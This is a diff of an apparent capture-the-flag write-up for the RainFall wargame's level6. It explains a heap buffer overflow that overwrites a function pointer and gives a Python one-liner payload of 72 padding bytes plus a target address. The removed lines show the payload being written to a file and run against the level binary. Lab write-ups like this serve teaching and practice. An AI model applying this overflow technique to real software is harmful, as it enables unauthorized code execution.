@@ -1,8 +1,7 @@
-```
-0xbffff6c0:	0xb7fed280	0x00000000	0x0804a050 	0x0804a008
-```
+Exploit: change the value of a function pointer stored in the heap to access a other function.
+
+An unprotected buffer is pointing to an address in memory, right before the function pointer. As the input is not protected, we can overflow the buffer in order to write in the memory used by the function pointer.
 
 ```
-level6@RainFall:~$ python -c 'print "A" * 0x48 + "\x54\x84\x04\x08" ' > /tmp/payload6
-level6@RainFall:~$ ./level6 "$(</tmp/payload6)"
+payload = python -c 'print "A" * 0x48 + "\x54\x84\x04\x08"'
 ```
